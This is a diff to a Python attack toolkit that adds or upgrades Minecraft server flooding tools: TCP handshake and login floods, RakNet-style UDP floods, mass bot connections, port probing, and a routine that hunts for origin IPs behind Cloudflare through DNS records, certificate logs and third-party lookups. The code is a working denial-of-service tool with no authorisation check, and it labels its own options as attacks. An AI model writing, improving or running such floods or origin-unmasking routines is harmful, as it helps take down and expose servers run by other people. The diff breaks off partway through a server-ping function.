@@ -2982,11 +2982,277 @@ def legacy_resolve(domain):
             return None
 
 
+MC_PORT_RANGES = [
+    25565, 25566, 25575, 25576, 25577, 25578,
+    19132, 19133, 25564, 25567, 25568, 25569, 25570,
+    25571, 25572, 25573, 25574, 25579, 25580,
+    25585, 25590, 25595, 25600, 25650, 25700, 25750,
+    25800, 25850, 25900, 25950, 26000, 26050, 26100,
+    26150, 26200, 26250, 26300, 26350, 26400, 26450,
+    26500, 26550, 26600, 26650, 26700, 26750, 26800,
+    26850, 26900, 26950, 27000, 27015, 27050, 27100,
+    20000, 20001, 20002, 20003, 20004, 20005,
+    10000, 10001, 10002, 10003, 10004, 10005,
+    30000, 30001, 30002, 30003, 30004, 30005,
+]
+
+
+def mc_find_ports(ip, verbose=True):
+    open_ports = []
+
+    if verbose:
+        print(f"  {c('Probing common MC ports directly (for containerized/Pterodactyl servers)...', Fore.CYAN)}")
+
+    def _probe(port, results, idx):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1.5)
+            r = s.connect_ex((ip, port))
+            s.close()
+            results[idx] = port if r == 0 else None
+        except Exception:
+            results[idx] = None
+
+    batch_size = 100
+    for batch_start in range(0, len(MC_PORT_RANGES), batch_size):
+        batch = MC_PORT_RANGES[batch_start:batch_start + batch_size]
+        br = {}
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            fs = {ex.submit(_probe, p, br, i): i for i, p in enumerate(batch)}
+            for f in as_completed(fs):
+                try: f.result()
+                except Exception: pass
+        for i, p in enumerate(batch):
+            if br.get(i) is not None:
+                open_ports.append(p)
+
+    try:
+        nmap_has = shutil.which("nmap")
+        if nmap_has:
+            mc_str = ",".join(str(p) for p in MINECRAFT_PORTS)
+            r = subprocess.run(["nmap", "-T4", "-Pn", "-p", mc_str, ip], capture_output=True, text=True, timeout=60)
+            for line in r.stdout.splitlines():
+                m = re.match(r'^(\d+)/tcp\s+open', line)
+                if m:
+                    p = int(m.group(1))
+                    if p not in open_ports:
+                        open_ports.append(p)
+    except Exception:
+        pass
+
+    open_ports.sort()
+    if verbose and open_ports:
+        print(f"  {c('Open MC ports:', Fore.GREEN)} {c(str(open_ports), Fore.CYAN)}")
+    elif verbose:
+        print(f"  {c('No MC ports detected. Try entering the port manually.', Fore.YELLOW)}")
+    return open_ports
+
+
+def find_real_ip(domain):
+    header_box(f"Real IP Finder: {domain}", Fore.YELLOW)
+    origin_ips = []
+
+    try:
+        socket.inet_aton(domain)
+        print(f"  {c('Already an IP address.', Fore.GREEN)}")
+        return domain
+    except OSError:
+        pass
+
+    cf_ips = set()
+    try:
+        r = subprocess.run(["dig", "+short", domain], capture_output=True, text=True, timeout=10)
+        for line in r.stdout.strip().splitlines():
+            line = line.strip().rstrip('.')
+            try:
+                socket.inet_aton(line)
+                cf_ips.add(line)
+            except OSError:
+                pass
+    except Exception:
+        pass
+
+    is_cf = False
+    cf_ranges = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+                 "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+                 "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+                 "197.234.", "198.41."]
+    for ip in cf_ips:
+        for prefix in cf_ranges:
+            if ip.startswith(prefix):
+                is_cf = True
+                break
+        if is_cf:
+            break
+
+    if is_cf:
+        print(f"  {c(SYM_WARN + ' Cloudflare detected!', Fore.RED)} Current IP: {c(list(cf_ips)[0], Fore.YELLOW)}")
+        print(f"  {c('Searching for origin IP...', Fore.CYAN)}")
+    else:
+        print(f"  {c('IPs:', Fore.GREEN)} {', '.join(cf_ips)}")
+
+    print(f"\n  {c('Checking DNS history and records...', Fore.CYAN)}")
+    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+
+    for prefix in ["", "mail.", "smtp.", "ftp.", "cpanel.", "webdisk.", "autodiscover."]:
+        sub = prefix + domain
+        try:
+            ips = subprocess.run(["dig", "+short", sub], capture_output=True, text=True, timeout=5)
+            for line in ips.stdout.strip().splitlines():
+                line = line.strip().rstrip('.')
+                try:
+                    socket.inet_aton(line)
+                    if line not in cf_ips:
+                        origin_ips.append((f"DNS:{sub}", line))
+                        print(f"    {c(f'DNS:{sub}', Fore.GREEN)} {SYM_ARROW} {c(line, Fore.YELLOW)}")
+                except OSError:
+                    pass
+        except Exception:
+            pass
+
+    try:
+        mx = subprocess.run(["dig", "+short", "MX", domain], capture_output=True, text=True, timeout=10)
+        for line in mx.stdout.strip().splitlines():
+            parts = line.strip().split()
+            if len(parts) >= 2:
+                mx_host = parts[1].strip().rstrip('.')
+                mx_ips = subprocess.run(["dig", "+short", mx_host], capture_output=True, text=True, timeout=5)
+                for mip in mx_ips.stdout.strip().splitlines():
+                    mip = mip.strip().rstrip('.')
+                    try:
+                        socket.inet_aton(mip)
+                        if mip not in cf_ips:
+                            origin_ips.append((f"MX:{mx_host}", mip))
+                            print(f"    {c(f'MX:{mx_host}', Fore.GREEN)} {SYM_ARROW} {c(mip, Fore.YELLOW)}")
+                    except OSError:
+                        pass
+    except Exception:
+        pass
+
+    try:
+        txt = subprocess.run(["dig", "+short", "TXT", domain], capture_output=True, text=True, timeout=10)
+        for line in txt.stdout.strip().splitlines():
+            for part in re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
+                try:
+                    socket.inet_aton(part)
+                    if part not in cf_ips:
+                        origin_ips.append((f"TXT:{domain}", part))
+                        print(f"    {c(f'TXT record', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
+                except OSError:
+                    pass
+    except Exception:
+        pass
+
+    try:
+        spf = subprocess.run(["dig", "+short", "TXT", f"spf._dmarc.{domain}"], capture_output=True, text=True, timeout=5)
+        for line in spf.stdout.strip().splitlines():
+            for part in re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
+                try:
+                    socket.inet_aton(part)
+                    if part not in cf_ips:
+                        origin_ips.append((f"DMARC", part))
+                        print(f"    {c('DMARC record', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
+                except OSError:
+                    pass
+    except Exception:
+        pass
+
+    try:
+        ns = subprocess.run(["dig", "+short", "NS", domain], capture_output=True, text=True, timeout=10)
+        for line in ns.stdout.strip().splitlines():
+            ns_host = line.strip().rstrip('.')
+            if ns_host and domain not in ns_host:
+                ns_ips = subprocess.run(["dig", "+short", ns_host], capture_output=True, text=True, timeout=5)
+                for nip in ns_ips.stdout.strip().splitlines():
+                    nip = nip.strip().rstrip('.')
+                    try:
+                        socket.inet_aton(nip)
+                        if nip not in cf_ips:
+                            origin_ips.append((f"NS:{ns_host}", nip))
+                            print(f"    {c(f'NS:{ns_host}', Fore.GREEN)} {SYM_ARROW} {c(nip, Fore.YELLOW)}")
+                    except OSError:
+                        pass
+    except Exception:
+        pass
+
+    print(f"\n  {c('Scanning Certificate Transparency (crt.sh)...', Fore.CYAN)}")
+    try:
+        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
+        if r.status_code == 200:
+            data = r.json()
+            seen = set()
+            for entry in data[:200]:
+                names = entry.get("name_value", "").split("\n")
+                for name in names:
+                    name = name.strip().lower()
+                    if name.endswith(f".{domain}") or name == domain:
+                        if name not in seen:
+                            seen.add(name)
+                            try:
+                                rs = subprocess.run(["dig", "+short", name], capture_output=True, text=True, timeout=5)
+                                for line in rs.stdout.strip().splitlines():
+                                    line = line.strip().rstrip(".")
+                                    try:
+                                        socket.inet_aton(line)
+                                        if line not in cf_ips and line not in [x[1] for x in origin_ips]:
+                                            origin_ips.append((f"CT:{name}", line))
+                                            print(f"    {c(f'CT:{name}', Fore.GREEN)} {SYM_ARROW} {c(line, Fore.YELLOW)}")
+                                    except: pass
+                            except: pass
+            print(f"  {c(f'Scanned {len(seen)} subdomains from CT logs', Fore.GREEN)}")
+    except Exception as e:
+        print(f"  {RED}crt.sh error: {e}{RESET}")
+
+    print(f"\n  {c('Trying HTTP host-header leak...', Fore.CYAN)}")
+    for scheme in ["http", "https"]:
+        for port in [80, 443, 8080, 8443]:
+            try:
+                url = f"{scheme}://{domain}"
+                r = requests.get(url, timeout=5, allow_redirects=False,
+                    headers={"Host": f"nonexistent.{domain}"},
+                    verify=False)
+                if r.headers.get("Server") or r.status_code < 500:
+                    pass
+            except Exception:
+                pass
+
+    try:
+        r = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
+        if r.status_code == 200:
+            for line in r.text.strip().splitlines():
+                for part in re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
+                    try:
+                        socket.inet_aton(part)
+                        if part not in cf_ips and part not in [x[1] for x in origin_ips]:
+                            origin_ips.append(("HackerTarget", part))
+                            print(f"    {c('HackerTarget', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
+                    except OSError:
+                        pass
+    except Exception:
+        pass
+
+    print(f"\n{Fore.CYAN}{'─'*50}{RESET}")
+    if origin_ips:
+        unique_ips = list(dict.fromkeys(ip for _, ip in origin_ips))
+        print(f"\n  {c(SYM_CHECK + ' Possible origin IPs found:', Fore.GREEN)}")
+        for source, ip in origin_ips:
+            print(f"    {c(f'{source:25s}', Fore.CYAN)} {c(ip, Fore.YELLOW)}")
+        real_ip = unique_ips[0]
+        print(f"\n  {c('Best candidate:', Fore.GREEN)} {c(real_ip, Fore.YELLOW)}")
+        return real_ip
+    else:
+        print(f"  {c('No origin IP found via passive methods.', Fore.YELLOW)}")
+        print(f"  {c('The domain may be fully proxied. Try manual investigation.', Fore.YELLOW)}")
+        ip_list = ", ".join(cf_ips)
+        print(f"  {c(f'Resolved IPs: {ip_list}', Fore.CYAN)}")
+        return list(cf_ips)[0] if cf_ips else None
+
+
 def legacy_nmap(target):
     header_box(f"Port Scan: {target}", Fore.MAGENTA)
     open_ports = []
     try:
-        r = subprocess.run(["nmap", "-T4", "-F", target], capture_output=True, text=True, timeout=120)
+        r = subprocess.run(["nmap", "-T4", "-Pn", "-F", target], capture_output=True, text=True, timeout=120)
         for line in r.stdout.splitlines():
             m = re.match(r'^(\d+)/tcp\s+open', line)
             if m: open_ports.append(int(m.group(1)))
@@ -2994,7 +3260,7 @@ def legacy_nmap(target):
         pass
     try:
         mc_str = ",".join(str(p) for p in MINECRAFT_PORTS)
-        r = subprocess.run(["nmap", "-T4", "-p", mc_str, target], capture_output=True, text=True, timeout=60)
+        r = subprocess.run(["nmap", "-T4", "-Pn", "-p", mc_str, target], capture_output=True, text=True, timeout=60)
         for line in r.stdout.splitlines():
             m = re.match(r'^(\d+)/tcp\s+open', line)
             if m:
@@ -3016,69 +3282,105 @@ def legacy_nmap(target):
     return open_ports
 
 
-def mc_tcp_flood_worker(ip, port, duration, results, idx):
+def _mc_build_handshake(ip, port):
+    return _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
+
+
+def _mc_build_login(name=None):
+    if name is None:
+        name = f"Bot_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
+    return _mc_packet(0x00, _mc_pstr(name))
+
+
+def mc_tcp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
     sent = 0
+    errs = 0
     end = time.time() + duration
+    hs = _mc_build_handshake(ip, port)
     try:
         while time.time() < end:
+            s = None
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.settimeout(4)
+                s.settimeout(3)
                 s.connect((ip, port))
-                host = ip
-                handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(host), port.to_bytes(2, "big"), _mc_varint(2))
-                s.sendall(handshake)
+                s.sendall(hs)
+                s.sendall(_mc_build_login())
                 sent += 1
-                username = f"Flood_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
-                login = _mc_packet(0x00, _mc_pstr(username))
-                s.sendall(login)
-                sent += 1
+                results[idx] = (sent, errs)
             except Exception:
-                time.sleep(0.02)
+                errs += 1
+                results[idx] = (sent, errs)
+                if s:
+                    try: s.close()
+                    except Exception: pass
                 continue
-            while time.time() < end:
-                try:
-                    s.settimeout(1)
-                    v = 0
-                    for i in range(5):
-                        b = s.recv(1)
-                        if not b:
-                            break
-                        v |= (b[0] & 0x7F) << (7 * i)
-                        if not (b[0] & 0x80):
-                            break
-                    if v:
-                        pid_byte = s.recv(1)
-                        if pid_byte and pid_byte[0] == 0x21:
-                            s.sendall(_mc_packet(0x0F))
+            if mode == "rapid":
+                try: s.close()
+                except Exception: pass
+            else:
+                end2 = min(time.time() + 2, end)
+                while time.time() < end2:
+                    try:
+                        s.settimeout(0.5)
+                        plen = _mc_read_varint(s)
+                        if plen is None: break
+                        pid = _mc_read_varint(s)
+                        if pid is None: break
+                        rest = plen - len(_mc_varint(pid))
+                        data = b""
+                        while len(data) < rest:
+                            chunk = s.recv(rest - len(data))
+                            if not chunk: break
+                            data += chunk
+                        if pid == 0x21:
+                            s.sendall(_mc_packet(0x0F, data))
                             sent += 1
-                except socket.timeout:
-                    s.sendall(_mc_packet(0x0F))
-                    sent += 1
-                except Exception:
-                    break
-            s.close()
-        results[idx] = sent
+                            results[idx] = (sent, errs)
+                    except socket.timeout:
+                        continue
+                    except Exception:
+                        break
+                try: s.close()
+                except Exception: pass
+        results[idx] = (sent, errs)
     except Exception:
-        results[idx] = sent
+        results[idx] = (sent, errs)
 
 
-def mc_udp_flood_worker(ip, port, duration, results, idx):
+def mc_udp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
     sent = 0
+    errs = 0
     end = time.time() + duration
+    RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = b"\x00" * 1024
         while time.time() < end:
             try:
+                timestamp = struct.pack(">Q", int(time.time() * 1000))
+                payload = b"\x01" + timestamp + RAKNET_MAGIC + os.urandom(8)
                 s.sendto(payload, (ip, port))
                 sent += 1
+                if sent % 100 == 0:
+                    results[idx] = (sent, errs)
             except Exception:
-                pass
-        results[idx] = sent
+                errs += 1
+                results[idx] = (sent, errs)
+        results[idx] = (sent, errs)
     except Exception:
-        results[idx] = sent
+        results[idx] = (sent, errs)
+
+
+def _probe_online(ip, port, timeout=3):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        s.close()
+        return True
+    except Exception:
+        return False
 
 
 def stress_minecraft():
@@ -3087,32 +3389,57 @@ def stress_minecraft():
     if not target: return
     ip = legacy_resolve(target)
     if not ip: return
-    ports = legacy_nmap(ip) or []
+
+    cf_ranges_ = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+                   "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+                   "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+                   "197.234.", "198.41."]
+    is_cf = any(ip.startswith(p) for p in cf_ranges_)
+    if is_cf:
+        ans = input(f"  {YELLOW}Cloudflare detected! Enter real origin IP if known (or press Enter to auto-scan): {SYM_PROMPT} {RESET}").strip()
+        if ans:
+            ip = ans
+            print(f"  {c(f'Using manual IP: {ip}', Fore.GREEN)}")
+        else:
+            print(f"  {c('Auto-scanning for real origin IP...', Fore.YELLOW)}")
+            from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as _TimeoutError
+            real_ips = []
+            with ThreadPoolExecutor(max_workers=1) as ex:
+                fut = ex.submit(cf_bypass, target, False)
+                try:
+                    real_ips = fut.result(timeout=60)
+                except _TimeoutError:
+                    print(f"  {c('Scan timed out.', Fore.RED)}")
+            if real_ips:
+                ip = real_ips[0]
+                print(f"  {c(f'Found origin IP: {ip}', Fore.GREEN)}")
+            else:
+                print(f"  {c('No origin IP found. Attack may not work through Cloudflare.', Fore.RED)}")
+
+    print(f"  {c('Scanning for Minecraft ports...', Fore.CYAN)}")
+    ports = mc_find_ports(ip)
     if ports:
-        p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        port = int(p_in) if p_in.isdigit() else 25565
+        print(f"  {c('Found MC ports:', Fore.GREEN)} {c(str(ports), Fore.CYAN)}")
     else:
-        p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        port = int(p_in) if p_in.isdigit() else 25565
+        print(f"  {c('No MC ports auto-detected (nmap may not see containerized servers).', Fore.YELLOW)}")
+
+    p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    port = int(p_in) if p_in.isdigit() else 25565
 
     print(f"\n  {c('Attack type:', Fore.CYAN)}")
     print(f"  {c('[1]', Fore.GREEN)}  Bot attack (Node.js mineflayer bots)")
-    print(f"  {c('[2]', Fore.GREEN)}  Packet flooding (TCP/UDP)")
-    print(f"  {c('[3]', Fore.GREEN)}  Both (bots + flood simultaneously)")
+    print(f"  {c('[2]', Fore.GREEN)}  TCP flood")
+    print(f"  {c('[3]', Fore.GREEN)}  UDP flood (Bedrock)")
+    print(f"  {c('[4]', Fore.GREEN)}  Both (bots + flood)")
     at = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-    if at not in ("1", "2", "3"):
+    if at not in ("1", "2", "3", "4"):
         print(f"  {RED}Invalid choice.{RESET}")
         return
 
-    # ── Collect all params upfront so prompts don't mix with output ──
-    bot_enabled = at in ("1", "3")
-    flood_enabled = at in ("2", "3")
+    bot_enabled = at in ("1", "4")
+    flood_enabled = at in ("2", "3", "4")
 
-    bc = 0
-    bd = 0
-    ft = "t"
-    dur = 30
-    cc = 200
+    bc = 0; bd = 0; ft = "r"; dur = 30; cc = 500
 
     if bot_enabled:
         _ensure_mineflayer()
@@ -3122,34 +3449,74 @@ def stress_minecraft():
         bd = int(bd_in) if bd_in.isdigit() else 30
 
     if flood_enabled:
-        print(f"  {c('Flood type:', Fore.CYAN)}")
-        print(f"  {c('[t]', Fore.GREEN)}  TCP flood (handshake+login spam, Java)")
-        print(f"  {c('[u]', Fore.GREEN)}  UDP flood (Bedrock, port 19132)")
-        print(f"  {c('[b]', Fore.GREEN)}  Both TCP+UDP")
-        ft = input(f"  {c(f'Choice (default t) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "t"
-        d_in = input(f"  {c(f'Flood duration seconds (default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        print(f"\n  {c('Flood type:', Fore.CYAN)}")
+        if at == "2":
+            print(f"  {c('[r/1]', Fore.GREEN)}  Rapid fire (max CPS)")
+            print(f"  {c('[s/2]', Fore.GREEN)}  Sustained (hold + keepalives)")
+            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "r"
+            ft = {"r": "r", "1": "r", "s": "s", "2": "s"}.get(ft_raw, "r")
+        elif at == "3":
+            ft = "u"
+            print(f"  {c('UDP flood (Bedrock protocol)', Fore.GREEN)}")
+        else:
+            print(f"  {c('[r/1]', Fore.GREEN)}  Rapid fire TCP (max CPS)")
+            print(f"  {c('[s/2]', Fore.GREEN)}  Sustained TCP (hold + keepalive)")
+            print(f"  {c('[u/3]', Fore.GREEN)}  UDP flood (Bedrock)")
+            print(f"  {c('[b/4]', Fore.GREEN)}  Both TCP rapid + UDP")
+            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "r"
+            ft = {"r": "r", "1": "r", "s": "s", "2": "s", "u": "u", "3": "u", "b": "b", "4": "b"}.get(ft_raw, "r")
+
+        d_in = input(f"  {c(f'Duration seconds (default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
         dur = int(d_in) if d_in.isdigit() else 30
-        c_in = input(f"  {c(f'Concurrent connections (default 200) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        cc = int(c_in) if c_in.isdigit() else 200
+        c_in = input(f"  {c(f'Concurrent connections (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        cc = int(c_in) if c_in.isdigit() else 500
+
+    # ── Online check ──
+    if flood_enabled:
+        print(f"\n  {c('Checking if host is online...', Fore.CYAN)}", end=" ")
+        sys.stdout.flush()
+        if _probe_online(ip, port):
+            print(f"{GREEN}{SYM_CHECK} online{RESET}")
+        else:
+            print(f"{RED}{SYM_X} unreachable{RESET}")
+            ans = input(f"  {YELLOW}Host not reachable on port {port}. Continue anyway? (y/N) {SYM_PROMPT} {RESET}").strip().lower()
+            if ans != "y":
+                print(f"  {c('Aborted.', Fore.RED)}")
+                return
 
     # ── Launch bots (non-blocking, background) ──
+    bot_proc = None
     if bot_enabled:
         bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
         if os.path.exists(bot_script):
-            print(f"  {c('Launching mineflayer bots in background...', Fore.CYAN)}")
-            subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)],
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print(f"  {c('Starting mineflayer bots...', Fore.CYAN)}")
+            try:
+                bot_proc = subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)],
+                                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                def _bot_reader():
+                    for line in iter(bot_proc.stdout.readline, ''):
+                        if line:
+                            sys.stdout.write(f"\r  {c('[Bot]', Fore.MAGENTA)} {line.strip()}{' '*40}\n")
+                            sys.stdout.flush()
+                import threading
+                t = threading.Thread(target=_bot_reader, daemon=True)
+                t.start()
+            except FileNotFoundError:
+                print(f"  {RED}{SYM_X} Node.js not found. Install Node.js 18+ to use mineflayer bots.{RESET}")
+                print(f"  {YELLOW}Falling back to raw TCP bots...{RESET}")
+                bot_enabled = False
+            except Exception as e:
+                print(f"  {RED}{SYM_X} Failed to launch bots: {e}{RESET}")
+                bot_enabled = False
         else:
             print(f"  {YELLOW}mc_bots.js not found. Running raw TCP bots in background...{RESET}")
             def _run_bots():
                 br = {}
-                with ThreadPoolExecutor(max_workers=200) as ex:
+                with ThreadPoolExecutor(max_workers=bc) as ex:
                     fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in range(bc)}
                     for f in as_completed(fs):
-                        try:
-                            f.result()
-                        except Exception:
-                            pass
+                        try: f.result()
+                        except Exception: pass
             import threading
             t = threading.Thread(target=_run_bots, daemon=True)
             t.start()
@@ -3157,44 +3524,89 @@ def stress_minecraft():
     # ── Run flood ──
     if flood_enabled:
         udp_port = 19132
-        def _run_flood(worker_func, workers, label, use_port):
-            start = time.time()
-            sent = 0
+        def _run_flood(worker_func, workers, label, use_port, mode="rapid"):
+            _stop = threading.Event()
+            _start = time.time()
+            _sent = [0]
+            _errs = [0]
             br = {}
-            with ThreadPoolExecutor(max_workers=workers) as ex:
-                fs = {ex.submit(worker_func, ip, use_port, dur, br, i): i for i in range(workers)}
-                try:
-                    while not all(f.done() for f in fs):
-                        done_count = sum(1 for f in fs if f.done())
-                        sys.stdout.write(f"\r  {c(label, Fore.CYAN)}  {c(f'Workers: {done_count}/{workers}', Fore.GREEN)}  {c(f'Runtime: {time.time()-start:.0f}s', Fore.YELLOW)}  {c('Ctrl+C to stop', Fore.DIM)}{' '*30}")
-                        sys.stdout.flush()
-                        time.sleep(0.5)
-                except KeyboardInterrupt:
-                    for f in fs:
-                        f.cancel()
+            actual_workers = workers
+
+            def _progress():
+                while not _stop.is_set():
+                    elapsed = time.time() - _start
+                    total_s = 0; total_e = 0
+                    for v in br.values():
+                        if isinstance(v, tuple) and len(v) == 2:
+                            total_s += v[0]; total_e += v[1]
+                    rate = total_s / elapsed if elapsed > 0 else 0
+                    bar_len = 30
+                    pct = min(elapsed / dur, 1.0) if dur > 0 else 1
+                    filled = int(bar_len * pct)
+                    bar = f"{GREEN}{'█'*filled}{DIM}{'░'*(bar_len-filled)}{RESET}"
+                    sys.stdout.write(f"\r  {CYAN}{label}{RESET} [{bar}] "
+                                     f"{GREEN}S:{total_s:,}{RESET} "
+                                     f"{RED}E:{total_e:,}{RESET} "
+                                     f"{MAGENTA}{rate:,.0f}/s{RESET} "
+                                     f"{YELLOW}{elapsed:.0f}s/{dur}s{RESET}  "
+                                     f"{DIM}Ctrl+C stop{RESET}{' '*20}")
+                    sys.stdout.flush()
+                    _stop.wait(0.3)
+
+            pt = threading.Thread(target=_progress, daemon=True)
+            pt.start()
+
+            ex = ThreadPoolExecutor(max_workers=actual_workers)
+            fs = {ex.submit(worker_func, ip, use_port, dur, br, i, mode): i for i in range(actual_workers)}
+            try:
                 for f in as_completed(fs):
+                    if _stop.is_set():
+                        break
                     try:
-                        sent += f.result()
+                        r = f.result()
+                        if isinstance(r, tuple) and len(r) == 2:
+                            _sent[0] += r[0]; _errs[0] += r[1]
                     except Exception:
                         pass
-            el = time.time() - start
-            rat = sent / el if el > 0 else 0
-            print(f"\n  {GREEN}{SYM_CHECK} {label} complete: {c(str(sent), Fore.CYAN)} pkts in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} pkt/s', Fore.MAGENTA)}){RESET}")
-            return sent
+            except KeyboardInterrupt:
+                _stop.set()
+                ex.shutdown(wait=False, cancel_futures=True)
+            finally:
+                _stop.set()
+                ex.shutdown(wait=False, cancel_futures=True)
+
+            pt.join(timeout=2)
+            el = time.time() - _start
+            rat = _sent[0] / el if el > 0 else 0
+            print(f"\n  {GREEN}{SYM_CHECK} {label}: {c(f'S:{_sent[0]:,}', Fore.GREEN)} {c(f'E:{_errs[0]:,}', Fore.RED)} in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:,.0f}/s', Fore.MAGENTA)}){RESET}")
+            return _sent[0]
 
         total = 0
-        if ft in ("t", "b"):
-            total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port)
-        if ft in ("u", "b"):
-            total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
-        print(f"  {c(SYM_CHECK + f' Total: {total} packets sent', Fore.GREEN)}")
+        try:
+            if ft in ("r", "s"):
+                mode = "rapid" if ft == "r" else "sustained"
+                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, mode)
+            elif ft == "u":
+                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+            elif ft == "b":
+                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, "rapid")
+                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+            print(f"  {c(SYM_CHECK + f' Total: {total:,} packets sent', Fore.GREEN)}")
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}Flood stopped by user.{RESET}")
     else:
         print(f"  {c('Bot attack running in background. Press Ctrl+C to stop.', Fore.YELLOW)}")
         try:
             while True:
+                if bot_proc and bot_proc.poll() is not None:
+                    print(f"\n  {c('Bots finished.', Fore.GREEN)}")
+                    break
                 time.sleep(1)
         except KeyboardInterrupt:
             print(f"\n  {YELLOW}Stopped.{RESET}")
+            if bot_proc:
+                try: bot_proc.terminate()
+                except Exception: pass
 
     print()
 
@@ -4230,7 +4642,21 @@ def _mc_packet(pid, *parts):
     body = bytes([pid]) + b"".join(parts)
     return _mc_varint(len(body)) + body
 
+
+def _mc_read_varint(sock):
+    v = 0
+    for i in range(5):
+        b = sock.recv(1)
+        if not b:
+            return None
+        v |= (b[0] & 0x7F) << (7 * i)
+        if not (b[0] & 0x80):
+            break
+    return v
+
+
 def _mc_bot_worker(host, port, results, idx):
+    s = None
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
@@ -4244,24 +4670,32 @@ def _mc_bot_worker(host, port, results, idx):
         while time.time() < end:
             try:
                 s.settimeout(0.5)
-                v = 0
-                for i in range(5):
-                    b = s.recv(1)
-                    if not b: break
-                    v |= (b[0] & 0x7F) << (7 * i)
-                    if not (b[0] & 0x80): break
-                if v:
-                    pid_byte = s.recv(1)
-                    if pid_byte and pid_byte[0] == 0x21:
-                        s.sendall(_mc_packet(0x0F))
+                plen = _mc_read_varint(s)
+                if plen is None:
+                    break
+                pid = _mc_read_varint(s)
+                if pid is None:
+                    break
+                rest = plen - len(_mc_varint(pid))
+                data = b""
+                while len(data) < rest:
+                    chunk = s.recv(rest - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                if pid == 0x21:
+                    s.sendall(_mc_packet(0x0F, data))
             except socket.timeout:
                 continue
             except Exception:
                 break
-        s.close()
         results[idx] = 1
     except Exception:
         results[idx] = 0
+    finally:
+        if s:
+            try: s.close()
+            except Exception: pass
 
 # ──────────────────────────────────────────────────────────
 #  MODULE 11: HASH & CRYPTO TOOLS
@@ -4934,6 +5368,306 @@ def osint_shodan():
         except: pass
     print()
 
+def _mc_server_ping(ip, port=25565, timeout=4):
+    """Minecraft server list ping — returns MOTD if server responds"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        hs = _mc_packet(0x00, _mc_varint(764), _mc_pstr(f"{ip}:{port}"), port.to_bytes(2, "big"), _mc_varint(2))
+        s.sendall(hs + _mc_packet(0x00, _mc_packet(0x01)))
+        s.sendall(_mc_varint(0x01) + _mc_varint(0x00))
+        s.settimeout(timeout)
+        plen = _mc_read_varint(s)
+        if plen:
+            pid = _mc_read_varint(s)
